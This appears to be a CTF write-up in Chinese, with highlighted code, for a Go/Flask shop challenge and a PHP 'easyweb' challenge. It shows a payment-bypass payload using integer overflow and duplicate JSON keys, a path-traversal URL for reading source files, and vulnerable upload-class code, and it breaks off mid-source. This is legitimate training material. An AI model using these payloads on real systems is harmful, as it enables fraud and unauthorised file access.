+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>
+
+<span class="kn">import</span> <span class="p">(</span>
+	<span class="s">&#34;github.com/buger/jsonparser&#34;</span>
+    <span class="s">&#34;fmt&#34;</span>
+	<span class="s">&#34;net/http&#34;</span>
+    <span class="s">&#34;io/ioutil&#34;</span>
+    <span class="s">&#34;io&#34;</span>
+<span class="p">)</span>
+
+<span class="kd">func</span> <span class="nf">pay</span><span class="p">(</span><span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">r</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">cost</span> <span class="kt">int64</span> <span class="p">=</span> <span class="mi">0</span>
+	<span class="kd">var</span> <span class="nx">err1</span> <span class="kt">int64</span> <span class="p">=</span> <span class="mi">0</span>
+    <span class="nx">json</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nf">ReadAll</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">Body</span><span class="p">)</span>
+	<span class="nx">secret</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">jsonparser</span><span class="p">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nx">json</span><span class="p">,</span> <span class="s">&#34;secret&#34;</span><span class="p">)</span>
+	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+        <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+    <span class="p">}</span>
+	<span class="k">if</span> <span class="nx">secret</span> <span class="o">!=</span> <span class="s">&#34;xxxx&#34;</span><span class="p">{</span>   <span class="c1">//secret已打码
+</span><span class="c1"></span>		<span class="nx">io</span><span class="p">.</span><span class="nf">WriteString</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;{\\&#34;</span><span class="kt">error</span><span class="err">\\</span><span class="s">&#34;: \\&#34;</span><span class="nx">secret</span> <span class="kt">error</span><span class="err">\\</span><span class="s">&#34;}&#34;</span><span class="p">)</span>
+		<span class="k">return</span>
+	<span class="p">}</span>
+	<span class="nx">money</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">jsonparser</span><span class="p">.</span><span class="nf">GetInt</span><span class="p">(</span><span class="nx">json</span><span class="p">,</span> <span class="s">&#34;money&#34;</span><span class="p">)</span>
+	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+        <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+    <span class="p">}</span>
+	<span class="nx">_</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">jsonparser</span><span class="p">.</span><span class="nf">ArrayEach</span><span class="p">(</span>
+			<span class="nx">json</span><span class="p">,</span>
+            <span class="kd">func</span><span class="p">(</span><span class="nx">value</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">,</span> <span class="nx">dataType</span> <span class="nx">jsonparser</span><span class="p">.</span><span class="nx">ValueType</span><span class="p">,</span> <span class="nx">offset</span> <span class="kt">int</span><span class="p">,</span> <span class="nx">err</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">id</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">jsonparser</span><span class="p">.</span><span class="nf">GetInt</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="s">&#34;id&#34;</span><span class="p">)</span>
+                <span class="nx">num</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">jsonparser</span><span class="p">.</span><span class="nf">GetInt</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="s">&#34;num&#34;</span><span class="p">)</span>
+				<span class="k">if</span> <span class="nx">id</span> <span class="o">==</span> <span class="mi">1</span><span class="p">{</span>
+					<span class="nx">cost</span> <span class="p">=</span> <span class="nx">cost</span> <span class="o">+</span> <span class="mi">200</span> <span class="o">*</span> <span class="nx">num</span>
+				<span class="p">}</span><span class="k">else</span> <span class="k">if</span> <span class="nx">id</span> <span class="o">==</span> <span class="mi">2</span><span class="p">{</span>
+					<span class="nx">cost</span> <span class="p">=</span> <span class="nx">cost</span> <span class="o">+</span> <span class="mi">1000</span> <span class="o">*</span> <span class="nx">num</span>
+				<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+					<span class="nx">err1</span> <span class="p">=</span> <span class="mi">1</span>
+				<span class="p">}</span>
+            <span class="p">},</span>
+        <span class="s">&#34;product&#34;</span><span class="p">)</span>
+	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+	<span class="p">}</span>
+	<span class="k">if</span> <span class="nx">err1</span> <span class="o">==</span> <span class="mi">1</span><span class="p">{</span>
+		<span class="nx">io</span><span class="p">.</span><span class="nf">WriteString</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;{\\&#34;</span><span class="kt">error</span><span class="err">\\</span><span class="s">&#34;: \\&#34;</span><span class="nx">id</span> <span class="kt">error</span><span class="err">\\</span><span class="s">&#34;}&#34;</span><span class="p">)</span>
+		<span class="k">return</span>
+	<span class="p">}</span>
+	<span class="k">if</span> <span class="nx">cost</span> <span class="p">&gt;</span> <span class="nx">money</span><span class="p">{</span>
+		<span class="nx">io</span><span class="p">.</span><span class="nf">WriteString</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;{\\&#34;</span><span class="kt">error</span><span class="err">\\</span><span class="s">&#34;: \\&#34;</span><span class="nx">Sorry</span><span class="p">,</span> <span class="nx">your</span> <span class="nx">credit</span> <span class="nx">is</span> <span class="nx">running</span> <span class="nx">low</span><span class="p">!</span><span class="err">\\</span><span class="s">&#34;}&#34;</span><span class="p">)</span>
+		<span class="k">return</span>
+	<span class="p">}</span>
+	<span class="nx">money</span> <span class="p">=</span> <span class="nx">money</span> <span class="o">-</span> <span class="nx">cost</span>
+    <span class="nx">io</span><span class="p">.</span><span class="nf">WriteString</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&#34;{\\&#34;</span><span class="kt">error</span><span class="err">\\</span><span class="s">&#34;:0,\\&#34;</span><span class="nx">money</span><span class="err">\\</span><span class="s">&#34;: %d}&#34;</span><span class="p">,</span> <span class="nx">money</span><span class="p">))</span>
+<span class="p">}</span>
+
+<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nx">mux</span> <span class="o">:=</span> <span class="nx">http</span><span class="p">.</span><span class="nf">NewServeMux</span><span class="p">()</span>
+    <span class="nx">mux</span><span class="p">.</span><span class="nf">HandleFunc</span><span class="p">(</span><span class="s">&#34;/pay&#34;</span><span class="p">,</span> <span class="nx">pay</span><span class="p">)</span>
+    <span class="nx">http</span><span class="p">.</span><span class="nf">ListenAndServe</span><span class="p">(</span><span class="s">&#34;:10002&#34;</span><span class="p">,</span> <span class="nx">mux</span><span class="p">)</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>一个go和python联合的题目，大概的逻辑是这样</p>
+<p>通俗点讲，python是用来发货的，go是用来付款的，python发货前会通过go来进行付款校验</p>
+<p>所以我们要获取flag，就得让python发货，而go不进行付款</p>
+<p>这里就有两个思路：</p>
+<ul>
+<li>go的整数溢出</li>
+<li>python的flask和go的jsonparser对于json同名数据的不同处理</li>
+</ul>
+<h2 id="go的整数溢出">go的整数溢出</h2>
+<p>这里的cost的定义为int64</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">var cost int64 = 0
+</code></pre></td></tr></table>
+</div>
+</div><p>最后生成cost的时候，我们传入num，然后计算cost去进行判断</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">if id == 1{
+    cost = cost + 200 * num
+}else if id == 2{
+    cost = cost + 1000 * num
+}else{
+    err1 = 1
+}
+</code></pre></td></tr></table>
+</div>
+</div><p>这里我们num传入很大的值，就会溢出，导致cost会小于money，这样就成功过了go</p>
+<h2 id="json处理不同">json处理不同</h2>
+<p>这里我搭建了一个本地的环境</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">request</span><span class="p">,</span><span class="n">Flask</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&#34;/buy&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">buy</span><span class="p">():</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">()</span>
+    <span class="n">product</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s2">&#34;product&#34;</span><span class="p">]</span>
+    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">product</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+	<span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="s2">&#34;on&#34;</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="mi">10000</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>可以看到，如果出现了同一个键的json数据，flask里面的get_json会取最后的</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802152526801.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802152526801"
+	
+	
+></p>
+<p>再看go的jsonparser</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>
+
+<span class="kn">import</span> <span class="s">&#34;github.com/buger/jsonparser&#34;</span>
+
+<span class="nx">data</span> <span class="o">:=</span> <span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="s">`{&#34;id&#34;:1,&#34;id&#34;:2}`</span><span class="p">)</span>
+
+<span class="nx">id</span> <span class="o">:=</span> <span class="nx">jsonparser</span><span class="p">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="s">&#34;id&#34;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="nx">id</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里却是取的前者</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802152622907.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802152622907"
+	
+	
+></p>
+<p>所以这里他们解析json的方式会不一样，那么我们传入这样的参数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{&#34;product&#34;:[{&#34;id&#34;:1,&#34;num&#34;:0},{&#34;id&#34;:2,&#34;num&#34;:0}],&#34;product&#34;:[{&#34;id&#34;:1,&#34;num&#34;:0},{&#34;id&#34;:2,&#34;num&#34;:1}]}
+</code></pre></td></tr></table>
+</div>
+</div><p>这里python收到以后，会取后者，也就是flag的num为1，而go会取前者，也就是flag的num为0</p>
+<p>这个意思就是，python会发货，但是go并不会花钱，达到购买的效果</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802152859262.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802152859262"
+	
+	
+></p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802152907019.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802152907019"
+	
+	
+></p>
+<h1 id="easyweb">easyweb</h1>
+<p>首先是一个文件读取的漏洞，但是要求读取的文件里面必须有demo或者host</p>
+<p>那么我们就可以这样做</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">/showfile.php?f=./demo/../index.php
+</code></pre></td></tr></table>
+</div>
+</div><p>读取到下面的文件</p>
+<p>index.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+    <span class="nv">$upload</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="s2">&#34;2022qwb&#34;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]);</span>
+    <span class="o">@</span><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$upload</span><span class="p">,</span> <span class="mo">0333</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="k">include</span> <span class="s1">&#39;upload.php&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>upload.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;class.php&#39;</span><span class="p">);</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">)){</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;fname&#39;</span><span class="p">])</span><span class="o">?!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;fname&#39;</span><span class="p">])</span><span class="o">:</span><span class="k">FALSE</span><span class="p">){</span>
+        <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;fname&#39;</span><span class="p">];</span>
+    <span class="p">}</span>
+    <span class="nv">$upload</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Upload</span><span class="p">();</span>
+    <span class="nv">$upload</span><span class="o">-&gt;</span><span class="na">upload</span><span class="p">();</span>
+<span class="p">}</span><span class="k">else</span> <span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;&lt;p class=&#39;tip&#39;&gt;guest can not upload file&lt;/p&gt;&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>class.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">Upload</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$filesize</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$date</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$tmp</span><span class="p">;</span>
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">];</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="nf">do_upload</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">session_id</span><span class="p">()</span><span class="o">.</span><span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;.jpg&#34;</span><span class="p">;</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nx">unlink</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">[</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span><span class="nx">md5</span><span class="p">(</span><span class="s2">&#34;2022qwb&#34;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="nv">$filename</span><span class="p">);</span>
+        <span class="k">echo</span> <span class="s1">&#39;upload  &#39;</span><span class="o">.</span><span class="s2">&#34;./&#34;</span><span class="o">.</span><span class="nx">md5</span><span class="p">(</span><span class="s2">&#34;2022qwb&#34;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">e</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; success!&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="nf">e</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
+        <span class="k">return</span> <span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="nf">upload</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">check</span><span class="p">())</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">do_upload</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$value</span><span class="p">){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filesize</span><span class="o">-&gt;</span><span class="nv">$value</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">date</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">tmp</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="nf">check</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nv">$allowed_types</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;jpg&#34;</span><span class="p">,</span><span class="s2">&#34;png&#34;</span><span class="p">,</span><span class="s2">&#34;jpeg&#34;</span><span class="p">);</span>
+        <span class="nv">$temp</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span>
+        <span class="nv">$extension</span> <span class="o">=</span> <span class="nx">end</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$extension</span><span class="p">,</span><span class="nv">$allowed_types</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s1">&#39;Invalid file!&#39;</span><span class="p">;</span>
+            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">GuestShow</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$contents</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span>
+    <span class="p">{</span>
+
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">=</span><span class="nv">$file</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+        <span class="nv">$str</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
+        <span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$value</span><span class="p">){</span>
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$value</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="nf">show</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">contents</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">);</span>
+        <span class="nv">$src</span> <span class="o">=</span> <span class="s2">&#34;data:jpg;base64,&#34;</span><span class="o">.</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">contents</span><span class="p">);</span>
+        <span class="k">echo</span> <span class="s2">&#34;&lt;img src=</span><span class="si">{</span><span class="nv">$src</span><span class="si">}</span><span class="s2"> /&gt;&#34;</span><span class="p">;</span>
